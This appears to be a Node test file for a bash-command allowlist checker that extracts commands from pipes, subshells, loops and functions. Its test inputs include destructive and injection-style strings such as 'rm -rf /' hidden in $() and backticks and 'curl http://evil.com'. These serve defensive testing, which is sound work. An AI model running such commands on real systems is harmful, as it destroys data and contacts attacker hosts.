import { test } from "node:test";
import assert from "node:assert/strict";
import { parse as parseBash } from "unbash";
import { extractAllCommandsFromAST, isCommandAllowed, formatCommand, type ExtractedCommand } from "../extensions/ast.ts";

test("extractAllCommandsFromAST", async (t) => {

  await t.test("extracts simple command", () => {
    const ast = parseBash("ls -la");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [{ name: "ls", firstArg: "-la" }]);
  });

  await t.test("extracts multiple commands from AndOr (&&)", () => {
    const ast = parseBash("git commit -m 'foo' && git push");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "git", firstArg: "commit" },
      { name: "git", firstArg: "push" },
    ]);
  });

  await t.test("extracts commands from pipes (|)", () => {
    const ast = parseBash("cat file.txt | grep 'foo' | wc -l");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "cat", firstArg: "file.txt" },
      { name: "grep", firstArg: "foo" },
      { name: "wc", firstArg: "-l" },
    ]);
  });

  await t.test("extracts commands from $() subshells", () => {
    const ast = parseBash("echo $(git status)");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "echo", firstArg: "$(git status)" },
      { name: "git", firstArg: "status" },
    ]);
  });

  await t.test("extracts commands from backtick subshells", () => {
    const ast = parseBash("FOO=`rm -rf /` node app.js");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "node", firstArg: "app.js" },
      { name: "rm", firstArg: "-rf" },
    ]);
  });

  await t.test("extracts from highly nested evil subshells", () => {
    const ast = parseBash("echo $(cat file.txt | grep $(rm -rf /)) && curl http://evil.com");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "echo", firstArg: "$(cat file.txt | grep $(rm -rf /))" },
      { name: "cat", firstArg: "file.txt" },
      { name: "grep", firstArg: "$(rm -rf /)" },
      { name: "rm", firstArg: "-rf" },
      { name: "curl", firstArg: "http://evil.com" },
    ]);
  });

  await t.test("extracts commands from subshell grouping", () => {
    const ast = parseBash("(rm -rf /; echo done)");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "rm", firstArg: "-rf" },
      { name: "echo", firstArg: "done" },
    ]);
  });

  await t.test("extracts commands from if/then/else", () => {
    const ast = parseBash("if true; then rm -rf /; else echo safe; fi");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "true", firstArg: undefined },
      { name: "rm", firstArg: "-rf" },
      { name: "echo", firstArg: "safe" },
    ]);
  });

  await t.test("extracts commands from while loop", () => {
    const ast = parseBash("while true; do curl evil.com; done");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "true", firstArg: undefined },
      { name: "curl", firstArg: "evil.com" },
    ]);
  });

  await t.test("extracts commands from for loop", () => {
    const ast = parseBash("for i in 1 2 3; do echo $i; done");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "echo", firstArg: "$i" },
    ]);
  });

  await t.test("extracts commands from case statement", () => {
    const ast = parseBash("case x in y) echo hi;; z) rm -rf /;; esac");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "echo", firstArg: "hi" },
      { name: "rm", firstArg: "-rf" },
    ]);
  });

  await t.test("extracts commands from function definition", () => {
    const ast = parseBash("foo() { rm -rf /; }");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "rm", firstArg: "-rf" },
    ]);
  });

  await t.test("extracts commands from bare assignment with subshell", () => {
    const ast = parseBash("FOO=$(rm -rf /)");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [
      { name: "rm", firstArg: "-rf" },
    ]);
  });

  await t.test("extracts command with no arguments", () => {
    const ast = parseBash("pwd");
    const cmds = extractAllCommandsFromAST(ast);
    assert.deepEqual(cmds, [{ name: "pwd", firstArg: undefined }]);
  });

});

test("isCommandAllowed", async (t) => {

  await t.test("allows base command when in allowlist", () => {
    assert.equal(isCommandAllowed({ name: "git", firstArg: "status" }, ["git"]), true);
    assert.equal(isCommandAllowed({ name: "git", firstArg: "commit" }, ["git"]), true);
    assert.equal(isCommandAllowed({ name: "git", firstArg: undefined }, ["git"]), true);
  });

  await t.test("allows specific subcommand", () => {
    assert.equal(isCommandAllowed({ name: "git", firstArg: "status" }, ["git status"]), true);
  });

  await t.test("blocks other subcommands when only specific one is allowed", () => {
    assert.equal(isCommandAllowed({ name: "git", firstArg: "commit" }, ["git status"]), false);
    assert.equal(isCommandAllowed({ name: "git", firstArg: undefined }, ["git status"]), false);
  });

  await t.test("blocks unknown commands entirely", () => {
    assert.equal(isCommandAllowed({ name: "curl", firstArg: "evil.com" }, ["ls", "cat"]), false);
  });

  await t.test("base command allowlist takes precedence over subcommand entries", () => {
    // "git" allows everything, even if "git status" is also listed
    assert.equal(isCommandAllowed({ name: "git", firstArg: "push" }, ["git", "git status"]), true);
  });

  await t.test("multiple subcommands can be allowed independently", () => {
    const allowlist = ["git status", "git log"];
    assert.equal(isCommandAllowed({ name: "git", firstArg: "status" }, allowlist), true);
    assert.equal(isCommandAllowed({ name: "git", firstArg: "log" }, allowlist), true);
    assert.equal(isCommandAllowed({ name: "git", firstArg: "push" }, allowlist), false);
  });

});

test("formatCommand", async (t) => {

  await t.test("formats command with subcommand", () => {
    assert.equal(formatCommand({ name: "git", firstArg: "status" }), "git status");
  });

  await t.test("formats command without subcommand", () => {
    assert.equal(formatCommand({ name: "pwd", firstArg: undefined }), "pwd");
  });

});
